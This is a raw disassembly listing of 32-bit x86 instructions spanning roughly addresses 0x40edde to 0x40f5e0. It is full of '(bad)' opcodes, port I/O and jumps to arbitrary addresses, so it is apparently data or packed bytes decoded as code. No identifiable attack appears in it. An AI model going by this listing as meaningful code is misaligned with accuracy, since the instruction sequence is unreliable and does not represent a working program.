  40edde:	pop    es
  40eddf:	sub    edi,0xffffffed
  40ede2:	ret    
  40ede3:	(bad)  
  40ede4:	loope  0x40ed86
  40ede6:	push   esi
  40ede7:	xchg   DWORD PTR [ebx+0x17e063ff],edx
  40eded:	push   0xffffffc1
  40edef:	xor    eax,0x133ff522
  40edf4:	inc    ebx
  40edf5:	rcr    DWORD PTR [ebp-0x2c7f7347],cl
  40edfb:	and    al,0xf4
  40edfd:	test   BYTE PTR [edi+ebx*4+0x260460f1],0xe3
  40ee05:	mov    ecx,0xe9ad0fd2
  40ee0a:	xlat   BYTE PTR ds:[ebx]
  40ee0b:	xor    BYTE PTR [ebp+0x5f],cl
  40ee0e:	mov    ah,0x6b
  40ee10:	mov    DWORD PTR [eax],ebp
  40ee12:	mov    ah,0x1b
  40ee14:	fdivr  st(7),st
  40ee16:	add    eax,0xb2b415bf
  40ee1b:	or     BYTE PTR [esi-0x77508dff],bl
  40ee21:	jnp    0x40ee46
  40ee23:	jns    0x40ee96
  40ee25:	aam    0x82
  40ee27:	and    eax,0x5cae77b1
  40ee2c:	jle    0x40edba
  40ee2e:	les    edi,FWORD PTR [edx]
  40ee30:	cmp    bl,al
  40ee32:	pop    eax
  40ee33:	jmp    0x2ff8eac4
  40ee38:	outs   dx,BYTE PTR ds:[esi]
  40ee39:	inc    ebx
  40ee3a:	(bad)  
  40ee3b:	jecxz  0x40ee7a
  40ee3d:	scas   al,BYTE PTR es:[edi]
  40ee3e:	jnp    0x40ee93
  40ee40:	(bad)  
  40ee41:	mov    al,0x3
  40ee43:	sar    BYTE PTR [ecx+0x23],0xc4
  40ee47:	test   BYTE PTR [esi+0x2587644b],al
  40ee4d:	push   edi
  40ee4e:	cmp    eax,0x13e94961
  40ee53:	or     BYTE PTR [edx+ecx*8],al
  40ee56:	test   eax,0x731a6295
  40ee5b:	mov    eax,0x5676c57c
  40ee60:	jmp    0x40edfd
  40ee62:	rol    DWORD PTR [ebx-0x51bb1863],cl
  40ee68:	pop    esp
  40ee69:	test   BYTE PTR [esi+0x43],ah
  40ee6c:	mov    eax,0xc7170205
  40ee71:	fwait
  40ee72:	adc    al,0xbe
  40ee74:	outs   dx,BYTE PTR ds:[esi]
  40ee75:	mov    WORD PTR [ebp+0x19a2e825],es
  40ee7b:	fsubr  QWORD PTR [ecx-0x1927d4f2]
  40ee81:	int3   
  40ee82:	xor    al,0x88
  40ee84:	push   edi
  40ee85:	or     bl,bl
  40ee87:	or     eax,0xd0c73c1d
  40ee8c:	push   ebp
  40ee8d:	push   cs
  40ee8e:	or     DWORD PTR [esi+eiz*8+0x137a4aad],0xb6520eaa
  40ee99:	mov    bh,BYTE PTR [esi-0x7a262607]
  40ee9f:	push   0x5f
  40eea1:	sbb    bh,BYTE PTR [edx+0x58]
  40eea4:	fs hlt 
  40eea6:	imul   esi,edx,0x6da837c5
  40eeac:	adc    BYTE PTR [edi-0x4],0x29
  40eeb0:	add    dh,al
  40eeb2:	repnz repnz in al,dx
  40eeb5:	sbb    dl,BYTE PTR [edi]
  40eeb7:	xchg   ecx,eax
  40eeb8:	fld    QWORD PTR [eax]
  40eeba:	dec    esp
  40eebb:	retf   
  40eebc:	push   ds
  40eebd:	jnp    0x40ee49
  40eebf:	fadd   DWORD PTR [eax-0x54d8dd28]
  40eec5:	rcl    BYTE PTR [edx+0x58],cl
  40eec8:	jg     0x40eeda
  40eeca:	mov    eax,ds:0x46928d24
  40eecf:	aaa    
  40eed0:	(bad)  
  40eed1:	cmp    DWORD PTR [ebx-0x38],edi
  40eed4:	std    
  40eed5:	(bad)  
  40eed6:	in     eax,0xc6
  40eed8:	sbb    esi,esi
  40eeda:	jmp    0x40eec4
  40eedc:	lods   al,BYTE PTR ds:[esi]
  40eedd:	cld    
  40eede:	mov    esp,0xae473384
  40eee3:	punpckldq mm6,DWORD PTR [edx+0x11]
  40eee7:	dec    ebp
  40eee8:	xchg   ebp,eax
  40eee9:	ss pop es
  40eeeb:	push   ebp
  40eeec:	mov    ecx,0xc36e60d
  40eef1:	add    al,0x65
  40eef3:	dec    edx
  40eef4:	loope  0x40ef63
  40eef6:	repz xchg edi,eax
  40eef8:	or     bl,BYTE PTR [edi-0xa7c008a]
  40eefe:	mov    edx,0xedbe884f
  40ef03:	out    dx,eax
  40ef04:	mov    cl,0xab
  40ef06:	mov    dl,0xeb
  40ef08:	adc    BYTE PTR [ebp-0x7f87d02a],ch
  40ef0e:	and    eax,0x41c52288
  40ef13:	fistp  DWORD PTR [eax-0x4836da61]
  40ef19:	fstp   QWORD PTR [ebx]
  40ef1b:	ja     0x40ef76
  40ef1d:	aam    0x5b
  40ef1f:	jne    0x40eef4
  40ef21:	cmc    
  40ef22:	and    eax,0xc79440e2
  40ef27:	adc    cl,ch
  40ef29:	mov    edx,0x64ccd38f
  40ef2e:	mov    ebp,0xe35a667f
  40ef33:	jmp    0x9d49bd2
  40ef38:	fist   WORD PTR [edi+eax*1]
  40ef3b:	sub    ecx,DWORD PTR [eax+0x14]
  40ef3e:	push   ebx
  40ef3f:	xor    eax,0x3d0204c4
  40ef44:	and    al,0x99
  40ef46:	dec    esp
  40ef47:	ret    0x92d9
  40ef4a:	mov    bl,0x9d
  40ef4c:	imul   ebp,DWORD PTR [ebp+ecx*4-0x6a49d10d],0x70
  40ef54:	push   ebp
  40ef55:	imul   edi,DWORD PTR [ecx-0x26],0x15
  40ef59:	sub    dh,0xfa
  40ef5c:	pop    edi
  40ef5d:	push   eax
  40ef5e:	(bad)  
  40ef5f:	aam    0xe4
  40ef61:	cdq    
  40ef62:	repz pop DWORD PTR [edx+0x4ba7e8b0]
  40ef69:	test   al,0x96
  40ef6b:	loope  0x40ef1d
  40ef6d:	jle    0x40efed
  40ef6f:	mov    edi,0xebdaa84b
  40ef74:	ror    DWORD PTR [eax],cl
  40ef76:	sub    dl,ah
  40ef78:	fwait
  40ef79:	cli    
  40ef7a:	ficomp WORD PTR [ecx]
  40ef7c:	into   
  40ef7d:	mov    esi,0x4e7dad4
  40ef82:	loopne 0x40ef8e
  40ef84:	(bad)  
  40ef85:	jl     0x40ef12
  40ef87:	mov    ebp,0x5bdb9526
  40ef8c:	mov    esi,0x9e48b735
  40ef91:	sbb    dh,BYTE PTR [ecx+0x361f6db4]
  40ef97:	dec    ebx
  40ef98:	xor    DWORD PTR [edi-0x63296520],0xa78ddae1
  40efa2:	and    eax,0x52bab9c8
  40efa7:	sub    eax,0x99fd5ee2
  40efac:	cmp    eax,0xe9adea13
  40efb1:	outs   dx,BYTE PTR ds:[esi]
  40efb2:	cmp    ecx,DWORD PTR [esi+0x2b]
  40efb5:	sbb    BYTE PTR [esi+0x31d2205a],dh
  40efbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efbc:	loope  0x40efcc
  40efbe:	adc    BYTE PTR [edx-0x33],0x73
  40efc2:	xor    dl,BYTE PTR [edx-0x31bc1a70]
  40efc8:	and    al,al
  40efca:	xchg   edx,eax
  40efcb:	inc    dl
  40efcd:	retf   0xb286
  40efd0:	jg     0x40efa3
  40efd2:	jecxz  0x40ef56
  40efd4:	sub    edx,DWORD PTR [edi+0x469017a4]
  40efda:	lock jno 0x40ef6f
  40efdd:	jae    0x40ef97
  40efdf:	sbb    esi,esp
  40efe1:	adc    DWORD PTR [ebx+0x321e612e],ebp
  40efe7:	push   ebx
  40efe8:	ds dec edx
  40efea:	ror    ebx,0xfc
  40efed:	sub    BYTE PTR [edi],cl
  40efef:	(bad)  
  40eff0:	jnp    0x40f01f
  40eff2:	popa   
  40eff3:	ffreep st(3)
  40eff5:	scas   eax,DWORD PTR es:[edi]
  40eff6:	sub    dh,BYTE PTR [ecx]
  40eff8:	ret    0xd093
  40effb:	and    eax,0x9466cdba
  40f000:	retf   0xe192
  40f003:	sbb    BYTE PTR [ebx],ch
  40f005:	test   BYTE PTR [eax+0x3ef6034],ah
  40f00b:	in     al,0xf7
  40f00d:	cwde   
  40f00e:	and    DWORD PTR [ecx-0x1e370bb1],edi
  40f014:	das    
  40f015:	dec    eax
  40f016:	xor    cl,BYTE PTR [eax+0x26]
  40f019:	fwait
  40f01a:	int3   
  40f01b:	jbe    0x40f006
  40f01d:	adc    BYTE PTR [eax-0x4ffbc1fa],0xf1
  40f024:	lock mov eax,0x51932c45
  40f02a:	push   ds
  40f02b:	push   ds
  40f02c:	neg    ch
  40f02e:	xchg   BYTE PTR [esi+0x591bbc00],al
  40f034:	aad    0x58
  40f036:	test   eax,0x4730635b
  40f03b:	xchg   BYTE PTR [edx],bh
  40f03d:	mov    eax,0xcfcef2b1
  40f042:	mov    bl,0xab
  40f044:	mov    es:0xe166c2ac,eax
  40f04a:	xchg   BYTE PTR [eax+0x65],cl
  40f04d:	sahf   
  40f04e:	push   ecx
  40f04f:	adc    BYTE PTR [edi-0x270fb871],0x2f
  40f056:	xor    bl,BYTE PTR [esi]
  40f058:	sbb    DWORD PTR [esp+ebp*8-0x17],ebx
  40f05c:	adc    DWORD PTR [esi],ecx
  40f05e:	imul   esi,DWORD PTR [ebx],0x3e
  40f061:	test   BYTE PTR [ebx+eiz*2],bh
  40f064:	push   edx
  40f065:	ficom  DWORD PTR [esi+0x5a]
  40f068:	jo     0x40f09f
  40f06a:	sbb    ecx,DWORD PTR [edi+0x2f7563ba]
  40f070:	and    bl,BYTE PTR [edx+0x44]
  40f073:	inc    ebx
  40f074:	fisub  DWORD PTR [ecx+0x5]
  40f077:	add    eax,0x34e970b9
  40f07c:	dec    eax
  40f07d:	fistp  WORD PTR [edi-0x53]
  40f080:	jne    0x40f0e9
  40f082:	adc    DWORD PTR [esi],eax
  40f084:	repnz iret 
  40f086:	xor    eax,0x691af8ed
  40f08b:	scas   al,BYTE PTR es:[edi]
  40f08c:	adc    DWORD PTR cs:[esi+0x7c],esp
  40f090:	push   0x981bc921
  40f095:	stos   BYTE PTR es:[edi],al
  40f096:	xchg   ebp,eax
  40f097:	dec    ecx
  40f098:	mov    cl,0xcd
  40f09a:	pop    eax
  40f09b:	sub    ebp,DWORD PTR [edx-0x43]
  40f09e:	scas   eax,DWORD PTR es:[edi]
  40f09f:	js     0x40f0d3
  40f0a1:	xlat   BYTE PTR ds:[ebx]
  40f0a2:	(bad)  
  40f0a3:	mov    dh,0x2e
  40f0a5:	or     al,0xc
  40f0a7:	inc    ebp
  40f0a8:	and    al,0x81
  40f0aa:	fs push edi
  40f0ac:	call   0x1eac8e4a
  40f0b1:	test   al,0xd6
  40f0b3:	test   esi,esi
  40f0b5:	(bad)  
  40f0b6:	mov    edi,0x841f96ea
  40f0bb:	inc    esp
  40f0bc:	lods   al,BYTE PTR ds:[esi]
  40f0bd:	test   eax,0xd62388cb
  40f0c2:	ret    
  40f0c3:	and    eax,0x3e9a303
  40f0c8:	ins    DWORD PTR es:[edi],dx
  40f0c9:	int    0x3b
  40f0cb:	ror    ah,cl
  40f0cd:	push   0xae830bb
  40f0d2:	imul   ecx,DWORD PTR [ebx-0x2c49d781],0x26
  40f0d9:	jle    0x40f09a
  40f0db:	adc    al,0x90
  40f0dd:	jp     0x40f0cc
  40f0df:	mov    esi,0xe9d6b104
  40f0e4:	lock retf 
  40f0e6:	xchg   esi,eax
  40f0e7:	mov    edi,0x5cc90972
  40f0ec:	(bad)  
  40f0ed:	les    edi,FWORD PTR [esi-0x55]
  40f0f0:	add    ebx,eax
  40f0f2:	popf   
  40f0f3:	lods   al,BYTE PTR ds:[esi]
  40f0f4:	(bad)  
  40f0f5:	and    BYTE PTR [ebp+0x3f],dl
  40f0f8:	dec    ebp
  40f0f9:	push   edi
  40f0fa:	fs cwde 
  40f0fc:	adc    esp,DWORD PTR [edx+edx*4+0x7e]
  40f100:	fnstcw WORD PTR [ebx-0x2ca19a79]
  40f106:	mov    eax,eax
  40f108:	cld    
  40f109:	and    al,0x7d
  40f10b:	xchg   esi,eax
  40f10c:	sahf   
  40f10d:	mov    ebx,DWORD PTR [eax+edx*8-0x1ed1e382]
  40f114:	jg     0x40f096
  40f116:	push   cs
  40f117:	lods   al,BYTE PTR ds:[esi]
  40f118:	push   edi
  40f119:	retf   
  40f11a:	iret   
  40f11b:	imul   edx,DWORD PTR [esi+0x25],0xffffffd1
  40f11f:	stos   BYTE PTR es:[edi],al
  40f120:	jmp    0xc28900c
  40f125:	arpl   WORD PTR [eax],di
  40f127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f128:	jnp    0x40f131
  40f12a:	mov    eax,cs:0xe5513947
  40f130:	fwait
  40f131:	data16 mov al,0x86
  40f134:	iret   
  40f135:	mov    edx,0x6ac695fc
  40f13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f13b:	hlt    
  40f13c:	stc    
  40f13d:	adc    edx,edx
  40f13f:	dec    edi
  40f140:	push   ebp
  40f141:	daa    
  40f142:	push   0x31
  40f144:	ja     0x40f142
  40f146:	fnsave [esi+0x502a0e9e]
  40f14c:	outs   dx,BYTE PTR ds:[esi]
  40f14d:	mov    ch,0xad
  40f14f:	mov    esp,0x105ecf4
  40f154:	sub    BYTE PTR gs:[edi+0x699b12f9],dl
  40f15b:	mov    esp,0xa2a6817f
  40f160:	mov    BYTE PTR [ecx],0xd2
  40f163:	aas    
  40f164:	adc    dh,bl
  40f166:	pop    ecx
  40f167:	mov    edi,0xbde27460
  40f16c:	loopne 0x40f1d8
  40f16e:	mov    bl,0x1a
  40f170:	scas   eax,DWORD PTR es:[edi]
  40f171:	retf   
  40f172:	adc    DWORD PTR [edx],edi
  40f174:	mov    ch,bh
  40f176:	add    BYTE PTR [esi-0x76a2aa3a],al
  40f17c:	or     ch,ah
  40f17e:	in     al,0xd1
  40f180:	(bad)  
  40f181:	jae    0x40f113
  40f183:	test   al,0xaa
  40f185:	cmp    DWORD PTR [eax+0x6a9b49dc],0x27
  40f18c:	pushf  
  40f18d:	stos   DWORD PTR es:[edi],eax
  40f18e:	rcr    BYTE PTR [edi+0x26],0x56
  40f192:	mov    ebx,0x9a18b4f0
  40f197:	xor    BYTE PTR [edi],bl
  40f199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f19a:	in     eax,0x18
  40f19c:	pusha  
  40f19d:	adc    ecx,eax
  40f19f:	and    DWORD PTR [edx-0x6dcd8777],esi
  40f1a5:	ds push esi
  40f1a7:	dec    esp
  40f1a8:	mov    ss,WORD PTR [edi]
  40f1aa:	mov    dl,0x78
  40f1ac:	lods   al,BYTE PTR ds:[esi]
  40f1ad:	xchg   esp,eax
  40f1ae:	dec    ebx
  40f1af:	mov    eax,0x3a42243e
  40f1b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b5:	in     al,dx
  40f1b6:	jne    0x40f21d
  40f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b9:	call   0x3993:0x5eb9c001
  40f1c0:	out    0xd1,al
  40f1c2:	mov    ebp,0x3fbc2dde
  40f1c7:	mov    eax,DWORD PTR [ecx-0x60727d7e]
  40f1cd:	ins    DWORD PTR es:[edi],dx
  40f1ce:	mov    esi,0xe8a126a5
  40f1d3:	sbb    DWORD PTR [ebp+0x24],ebx
  40f1d6:	arpl   WORD PTR [edx],bp
  40f1d8:	mov    dl,0xb0
  40f1da:	call   0xa3eb4628
  40f1df:	and    al,0x86
  40f1e1:	jl     0x40f248
  40f1e3:	lock and ebp,DWORD PTR [ebx]
  40f1e6:	loop   0x40f1be
  40f1e8:	jnp    0x40f215
  40f1ea:	push   ds
  40f1eb:	or     BYTE PTR [ecx+0x34],cl
  40f1ee:	sbb    bl,BYTE PTR [esi-0x5a]
  40f1f1:	pushf  
  40f1f2:	or     eax,0xbc5566d8
  40f1f7:	xor    eax,0x51c08486
  40f1fc:	jo     0x40f270
  40f1fe:	xor    ch,BYTE PTR [eax]
  40f200:	sbb    al,0xd2
  40f202:	xchg   ecx,eax
  40f203:	ror    DWORD PTR [eax-0x5a],0x73
  40f207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f208:	out    0xff,eax
  40f20a:	fidiv  WORD PTR [ecx]
  40f20c:	mov    es,WORD PTR [ecx+0x3e]
  40f20f:	xchg   BYTE PTR [ecx+0x71],dh
  40f212:	scas   eax,DWORD PTR es:[edi]
  40f213:	add    ah,BYTE PTR [eax]
  40f215:	and    dh,BYTE PTR [esi]
  40f217:	pushf  
  40f218:	xchg   esi,eax
  40f219:	in     eax,dx
  40f21a:	je     0x40f26f
  40f21c:	push   ebx
  40f21d:	dec    ecx
  40f21e:	mov    al,0xb0
  40f220:	out    dx,al
  40f221:	xchg   esp,eax
  40f222:	push   edx
  40f223:	sbb    eax,0x90e1bed8
  40f228:	pusha  
  40f229:	imul   edx,DWORD PTR [eax],0x8db09d16
  40f22f:	ja     0x40f248
  40f231:	pop    ds
  40f232:	inc    esp
  40f233:	ds pop ss
  40f235:	xchg   ebx,eax
  40f236:	pusha  
  40f237:	(bad)  
  40f238:	retf   
  40f239:	(bad)  
  40f23a:	ss cmc 
  40f23c:	ins    DWORD PTR es:[edi],dx
  40f23d:	imul   ebx,ecx,0x7f
  40f240:	retf   0x783f
  40f243:	mov    ch,BYTE PTR [edi-0x5a0e4f92]
  40f249:	or     DWORD PTR [ebp-0x4d],ebx
  40f24c:	push   edi
  40f24d:	(bad)  
  40f24f:	ins    DWORD PTR es:[edi],dx
  40f250:	jbe    0x40f246
  40f252:	daa    
  40f253:	or     ah,BYTE PTR [esi+ecx*2-0x1f]
  40f257:	cdq    
  40f258:	pop    esi
  40f259:	(bad)  
  40f25a:	and    eax,0x86daa417
  40f25f:	leave  
  40f260:	or     eax,0x6a744553
  40f265:	mov    edi,0x51584922
  40f26b:	dec    eax
  40f26c:	gs stc 
  40f26e:	mov    ds,WORD PTR [ebp+0x9]
  40f271:	nop
  40f272:	(bad)  
  40f273:	leave  
  40f274:	clc    
  40f275:	mov    dl,0x20
  40f277:	fdivr  DWORD PTR [esi*2-0x5422712c]
  40f27e:	add    al,0xa3
  40f280:	jp     0x40f2d4
  40f282:	push   es
  40f283:	ror    BYTE PTR [ebx+0x1c],1
  40f286:	mul    DWORD PTR [ebp+0x73]
  40f289:	and    bh,BYTE PTR [ecx-0x72]
  40f28c:	test   BYTE PTR [ecx-0x1139cca5],dh
  40f292:	add    al,BYTE PTR [ebp+0x70]
  40f295:	xchg   edx,eax
  40f296:	loopne 0x40f257
  40f298:	scas   eax,DWORD PTR es:[edi]
  40f299:	mov    ecx,0xba143743
  40f29e:	dec    esp
  40f29f:	(bad)  
  40f2a0:	fsub   QWORD PTR [ebx]
  40f2a2:	imul   esi,esp,0x462cea4f
  40f2a8:	lods   eax,DWORD PTR ds:[esi]
  40f2a9:	rcl    DWORD PTR [edi+0x2],cl
  40f2ac:	xchg   edx,eax
  40f2ad:	(bad)  
  40f2ae:	xchg   ecx,eax
  40f2af:	cmp    al,0x2f
  40f2b1:	out    dx,al
  40f2b2:	dec    ebx
  40f2b3:	ret    0x1e35
  40f2b6:	mov    esi,0xc2288561
  40f2bb:	loopne 0x40f25a
  40f2bd:	push   0x6548fea7
  40f2c2:	mov    BYTE PTR [ebx-0x44b973f0],cl
  40f2c8:	jbe    0x40f325
  40f2ca:	(bad)  
  40f2cb:	(bad)  
  40f2cc:	xchg   ecx,eax
  40f2cd:	out    0x80,eax
  40f2cf:	mov    esi,0x84b28141
  40f2d4:	fwait
  40f2d5:	jmp    0x40f2e1
  40f2d7:	dec    ebx
  40f2d8:	push   ebx
  40f2d9:	fld    DWORD PTR [ecx+esi*4+0x60]
  40f2dd:	sub    DWORD PTR [ecx+0x66520d83],ebp
  40f2e3:	stc    
  40f2e4:	sub    BYTE PTR ds:[edi-0x71],0x5e
  40f2e9:	sub    BYTE PTR [esi],dl
  40f2eb:	xchg   DWORD PTR [edi+0x23dfe41b],esp
  40f2f1:	push   ebp
  40f2f2:	pop    ss
  40f2f3:	iret   
  40f2f4:	ss xchg edx,eax
  40f2f6:	xchg   BYTE PTR [esi-0x595ceff8],bh
  40f2fc:	xchg   ebp,eax
  40f2fd:	inc    ebx
  40f2fe:	sbb    al,0xef
  40f300:	sbb    DWORD PTR [edi-0xf0ea01d],0x70
  40f307:	mov    bl,0x1f
  40f309:	sahf   
  40f30a:	pop    ss
  40f30b:	xchg   ebx,eax
  40f30c:	dec    edx
  40f30d:	fimul  WORD PTR ds:0xd5da09b5
  40f313:	fsubr  DWORD PTR [esi+ecx*8-0x2407d9f2]
  40f31a:	mov    esi,0xf3ac85b8
  40f31f:	in     eax,0x15
  40f321:	mov    DWORD PTR fs:[edx-0x6322943d],eax
  40f328:	jbe    0x40f2fd
  40f32a:	cld    
  40f32b:	leave  
  40f32c:	xchg   ebx,eax
  40f32d:	lds    ecx,FWORD PTR [edx+0x4b]
  40f330:	and    DWORD PTR [ebx+0x3b],ebx
  40f333:	repnz rol BYTE PTR [ecx],0x28
  40f337:	repz neg ebp
  40f33a:	icebp  
  40f33b:	(bad)  [esi+0x7b8be856]
  40f341:	idiv   DWORD PTR [ecx+edx*8]
  40f344:	push   esi
  40f345:	dec    edx
  40f346:	mov    DWORD PTR [ecx+0x33],edi
  40f349:	cmp    ebp,ecx
  40f34b:	sub    BYTE PTR [ecx+0x1],0x40
  40f34f:	push   ss
  40f350:	jmp    FWORD PTR [ecx+0x5]
  40f353:	or     eax,0xdce40170
  40f358:	jl     0x40f383
  40f35a:	lahf   
  40f35b:	hlt    
  40f35c:	outs   dx,DWORD PTR ds:[esi]
  40f35e:	cmp    eax,0x9157b572
  40f363:	js     0x40f3c6
  40f365:	into   
  40f366:	popa   
  40f367:	and    BYTE PTR [esi],0xc4
  40f36a:	inc    ebx
  40f36b:	retf   0x1e07
  40f36e:	inc    edi
  40f36f:	fidiv  DWORD PTR [edx+0x5c12444b]
  40f375:	sbb    DWORD PTR [ebx-0x29],ebx
  40f378:	loope  0x40f36d
  40f37a:	lahf   
  40f37b:	sub    al,0xd8
  40f37d:	clc    
  40f37e:	jecxz  0x40f3d3
  40f380:	pop    ebx
  40f381:	jne    0x40f3f1
  40f383:	push   esi
  40f384:	or     DWORD PTR [eax],0xffffffaa
  40f387:	xor    BYTE PTR [eax+0x5d],bh
  40f38a:	sub    eax,0xbdfa4bd4
  40f38f:	in     eax,0x6f
  40f391:	call   0x20ff:0x7f5b33da
  40f398:	in     al,dx
  40f399:	mov    esp,0xb5643738
  40f39e:	cmp    eax,0x7de82d47
  40f3a3:	dec    eax
  40f3a4:	(bad)  
  40f3a5:	or     BYTE PTR cs:[ecx+0x50],ch
  40f3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3aa:	hlt    
  40f3ab:	push   eax
  40f3ac:	in     al,dx
  40f3ad:	jmp    0x40f356
  40f3af:	fwait
  40f3b0:	dec    edi
  40f3b1:	sub    dh,BYTE PTR [ebx+0x1a]
  40f3b4:	inc    esi
  40f3b5:	dec    esi
  40f3b6:	mov    al,ds:0x21f2c85c
  40f3bb:	or     edx,DWORD PTR [esi]
  40f3bd:	and    eax,0xd6634c2
  40f3c2:	jbe    0x40f440
  40f3c4:	aad    0x9e
  40f3c6:	std    
  40f3c7:	xor    dh,BYTE PTR [esi+0x4ea82ab8]
  40f3cd:	and    eax,0x66cd00ce
  40f3d2:	mov    ah,BYTE PTR [ecx+0x393d20b1]
  40f3d8:	dec    esp
  40f3d9:	jecxz  0x40f360
  40f3db:	cdq    
  40f3dc:	dec    edx
  40f3dd:	mov    ebx,?
  40f3df:	xchg   ebx,eax
  40f3e0:	jg     0x40f373
  40f3e2:	out    0x85,al
  40f3e4:	pop    es
  40f3e5:	mov    WORD PTR [ecx],fs
  40f3e7:	xor    dl,BYTE PTR [esi]
  40f3e9:	aam    0xa0
  40f3eb:	rcl    esi,1
  40f3ed:	lahf   
  40f3ee:	pop    ss
  40f3ef:	pop    ebx
  40f3f0:	test   ebx,eax
  40f3f2:	mov    ds:0xbd298408,al
  40f3f7:	mov    edx,0x488cec57
  40f3fc:	out    dx,eax
  40f3fd:	outs   dx,DWORD PTR ds:[esi]
  40f3fe:	pop    ecx
  40f3ff:	sar    BYTE PTR [edi-0x43],1
  40f402:	stos   BYTE PTR es:[edi],al
  40f403:	push   cs
  40f404:	out    0x10,eax
  40f406:	les    edx,FWORD PTR ds:0xe95986e4
  40f40c:	add    BYTE PTR [edx-0x253525b0],cl
  40f412:	dec    esp
  40f413:	pusha  
  40f414:	imul   esp,ebx,0x4b
  40f417:	or     eax,0x79632f01
  40f41c:	cmp    DWORD PTR [esp+ebp*4-0x168c4a36],esi
  40f423:	xor    cl,ah
  40f425:	jg     0x40f44b
  40f427:	push   ss
  40f428:	and    BYTE PTR [ebp-0x73],bh
  40f42b:	mov    eax,ds:0xbdcd144b
  40f430:	adc    si,WORD PTR [edx-0x40316bfa]
  40f437:	in     eax,0xa6
  40f439:	jecxz  0x40f43c
  40f43b:	dec    ecx
  40f43c:	in     eax,0xe
  40f43e:	pusha  
  40f43f:	cmp    eax,0x169ca165
  40f444:	stc    
  40f445:	fild   QWORD PTR [ebx+0x7f100c69]
  40f44b:	iret   
  40f44c:	inc    eax
  40f44d:	in     eax,0x7
  40f44f:	call   FWORD PTR [ebx+0x42e6e8ad]
  40f455:	enter  0x27d4,0xa0
  40f459:	icebp  
  40f45a:	push   ss
  40f45b:	push   ebx
  40f45c:	dec    ebx
  40f45d:	mov    ebx,esp
  40f45f:	ds push ss
  40f461:	xchg   esi,eax
  40f462:	fstp   DWORD PTR [edx+0x76]
  40f465:	mov    al,0xa0
  40f467:	out    0xdb,ax
  40f46a:	cmp    al,0xb8
  40f46c:	dec    esp
  40f46d:	adc    BYTE PTR [esi+0x7edcb866],dl
  40f473:	xor    dl,BYTE PTR [edi+esi*8-0x3c6edd70]
  40f47a:	sar    BYTE PTR [eax+0x6e],1
  40f47d:	mov    edx,0xbc2fadbe
  40f482:	ins    DWORD PTR es:[edi],dx
  40f483:	adc    al,0xbd
  40f485:	xlat   BYTE PTR ds:[ebx]
  40f486:	enter  0x919b,0xb2
  40f48a:	enter  0xa209,0xc0
  40f48e:	leave  
  40f48f:	xchg   ebp,eax
  40f490:	adc    cl,dl
  40f492:	xor    DWORD PTR [edx-0x32feea94],0x9
  40f499:	add    BYTE PTR cs:[eax],al
	...
  40f514:	hlt    
  40f515:	test   BYTE PTR [eax-0x6b],cl
  40f518:	js     0x40f4f7
  40f51a:	std    
  40f51b:	in     eax,0xbe
  40f51d:	mov    bh,0x36
  40f51f:	ds scas eax,DWORD PTR es:[edi]
  40f521:	je     0x40f5a0
  40f523:	or     eax,0xa1a5
  40f528:	outs   dx,BYTE PTR ds:[esi]
  40f529:	pop    es
  40f52a:	add    BYTE PTR [eax],al
  40f52c:	cwde   
  40f52d:	xor    DWORD PTR [eax+0x13117890],ebx
  40f533:	or     edi,edi
  40f535:	mov    edi,0xf0d4bdd9
  40f53a:	pop    edi
  40f53b:	sti    
  40f53c:	mov    al,0xef
  40f53e:	mov    edi,0x7fe6b4
  40f543:	jmp    0x6f6e:0x312b68e8
  40f54a:	push   0xdfef2a60
  40f54f:	outs   dx,DWORD PTR ds:[esi]
  40f550:	es cdq 
  40f552:	cmp    DWORD PTR [ebp-0x28],edx
  40f555:	cmp    al,0x4
  40f557:	scas   al,BYTE PTR es:[edi]
  40f558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f559:	fnstenv [eax+edx*1+0xe]
  40f55d:	jbe    0x40f504
  40f55f:	push   ecx
  40f560:	push   ecx
  40f561:	mov    al,ds:0x2134078b
  40f566:	xor    ecx,esp
  40f568:	out    dx,eax
  40f569:	pop    ebx
  40f56a:	das    
  40f56b:	loopne 0x40f51e
  40f56d:	mov    ch,0xb8
  40f56f:	lea    ebx,[edx]
  40f571:	push   edx
  40f572:	fnstsw WORD PTR [ebx+esi*8]
  40f575:	stc    
  40f576:	mov    DWORD PTR [ebp-0x5a],ebp
  40f579:	ret    
  40f57a:	xlat   BYTE PTR ds:[ebx]
  40f57b:	in     al,dx
  40f57c:	adc    edi,DWORD PTR [esi]
  40f57e:	add    al,0x4b
  40f580:	xor    eax,0xd065cbf
  40f585:	call   DWORD PTR [eax-0x3f]
  40f588:	stos   BYTE PTR es:[edi],al
  40f589:	mov    cl,0xb3
  40f58b:	mov    al,0xa6
  40f58d:	jg     0x40f5c6
  40f58f:	add    bh,ah
  40f591:	lea    ecx,[esi+0x56]
  40f594:	add    esp,DWORD PTR [ecx-0x2]
  40f597:	(bad)  
  40f598:	(bad)  [edi-0x59869f8a]
  40f59e:	or     dh,BYTE PTR cs:[edx+edi*8]
  40f5a2:	push   ecx
  40f5a3:	(bad)  
  40f5a4:	cmp    al,0x2e
  40f5a6:	(bad)  
  40f5a7:	xchg   BYTE PTR [edi-0x20daa255],dh
  40f5ad:	sahf   
  40f5ae:	pusha  
  40f5af:	add    BYTE PTR [edi],dl
  40f5b1:	pop    ss
  40f5b2:	pop    ebx
  40f5b3:	mov    esp,0x421ad45e
  40f5b8:	mov    eax,0x3da25dfc
  40f5bd:	xchg   ebp,eax
  40f5be:	jno    0x40f593
  40f5c0:	mov    WORD PTR [ebp+0x5],es
  40f5c3:	xor    ah,BYTE PTR [esi+edx*2-0x61]
  40f5c7:	and    ebx,DWORD PTR [ebx]
  40f5c9:	lds    edi,FWORD PTR ds:0xefb0c727
  40f5cf:	dec    esi
  40f5d0:	rcl    BYTE PTR [esi],0xce
  40f5d3:	push   esi
  40f5d4:	mov    eax,ds:0x498175b1
  40f5d9:	pushf  
  40f5da:	idiv   DWORD PTR ss:[esi-0x35]
  40f5de:	fwait
  40f5df:	pusha  
  40f5e0:	push   edi
